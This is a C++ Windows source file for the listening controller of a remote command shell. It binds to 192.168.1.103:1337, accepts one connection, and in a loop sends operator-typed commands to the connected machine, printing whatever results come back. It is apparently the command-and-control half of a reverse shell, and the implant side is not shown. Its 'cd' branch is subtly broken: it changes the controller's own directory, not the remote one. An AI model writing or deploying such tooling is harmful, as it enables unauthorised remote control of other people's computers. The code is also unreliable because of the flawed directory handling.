#include <stdio.h>
#include <winsock2.h>
#include <WS2tcpip.h>
#include <sys/types.h>
#include <iostream>
#include <stdexcept>
#include <string>
#include <Windows.h>

#pragma comment(lib,"ws2_32.lib")

int main(int argc, char* argv[]) {
    WSADATA wsadata;
    SOCKET server_side;
    SOCKET client_side;
    int result;
    char command[4096];
    char recv_buffer[4096];
    struct sockaddr_in server_addr;

    int recv_length = sizeof(recv_buffer);
    int send_length = sizeof(command);

    result = WSAStartup(MAKEWORD(2, 2), &wsadata);
    if (result != 0) {
        printf("Error initializing Winsock!\n");
        printf("Error is: %lu\n", GetLastError());
        return 1;
    }

    server_side = socket(AF_INET, SOCK_STREAM, 0);
    if (server_side == INVALID_SOCKET) {
        printf("Error in creating socket!\n");
        printf("Error is: %lu\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(1337);
    if (inet_pton(AF_INET, "192.168.1.103", &server_addr.sin_addr) != 1) {
        printf("Error in setting server address!\n");
        printf("Error is: %lu\n", WSAGetLastError());
        closesocket(server_side);
        WSACleanup();
        return 1;
    }

    if (bind(server_side, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        printf("Bind failed.\n");
        printf("Error is: %lu\n", WSAGetLastError());
        closesocket(server_side);
        WSACleanup();
        return 1;
    }

    if (listen(server_side, 2) == SOCKET_ERROR) {
        printf("Listen failed.\n");
        printf("Error is: %lu\n", WSAGetLastError());
        closesocket(server_side);
        WSACleanup();
        return 1;
    }
    printf("Server listening for connection...\n");

    try {
        client_side = accept(server_side, NULL, NULL);
        if (client_side == INVALID_SOCKET) {
            throw std::runtime_error("Connection refused");
        }
        std::cout << "Connection accepted!\n";
    }
    catch (const std::runtime_error& e) {
        std::cout << "Connection Failed from client: " << e.what() << std::endl;
        closesocket(server_side);
        WSACleanup();
        return 1;
    }
    catch (...) {
        std::cout << "An unknown error occurred\n";
        closesocket(server_side);
        WSACleanup();
        return 1;
    }

    while (true) {
        printf("[+] Please enter a command: ");
        std::cin.getline(command, send_length);

        if (strlen(command) == 0) {
            continue;
        }

        if (strncmp(command, "cd", 2) == 0) {
            std::string path = command + 3;

            if (path == "..") {
                if (!SetCurrentDirectoryA("..")) {
                    std::cerr << "Failed to move up a directory." << std::endl;
                }
            }
            else {
                if (!SetCurrentDirectoryA(path.c_str())) {
                    std::cerr << "Failed to change directory to: " << path << std::endl;
                }
            }

            char currentDirectory[MAX_PATH];
            if (GetCurrentDirectoryA(MAX_PATH, currentDirectory) != 0) {
                send(client_side, currentDirectory, static_cast<int>(strlen(currentDirectory)), 0);
            }
            else {
                std::cerr << "Failed to get current directory." << std::endl;
            }
            continue; 
        }
        int send_result = send(client_side, command, static_cast<int>(strlen(command)), 0);
        if (send_result == SOCKET_ERROR) {
            printf("Send failed.\n");
            printf("Error is: %lu\n", WSAGetLastError());
            closesocket(client_side);
            closesocket(server_side);
            WSACleanup();
            return 1;
        }

        int recv_result = recv(client_side, recv_buffer, recv_length - 1, 0);
        if (recv_result <= 0) {
            printf("No receiving data or connection closed by client!\n");
            closesocket(client_side);
            closesocket(server_side);
            WSACleanup();
            return EXIT_FAILURE;
        }

        recv_buffer[recv_result] = '\0';
        printf("Result: %s\n", recv_buffer);

        if (strcmp(command, "exit") == 0 || strcmp(command, "quit") == 0) {
            printf("Connection closed by server exit!\n");
            closesocket(client_side);
            closesocket(server_side);
            WSACleanup();
            return 0;
        }
    }
    closesocket(server_side);
    closesocket(client_side);
    WSACleanup();

    return 0;
}
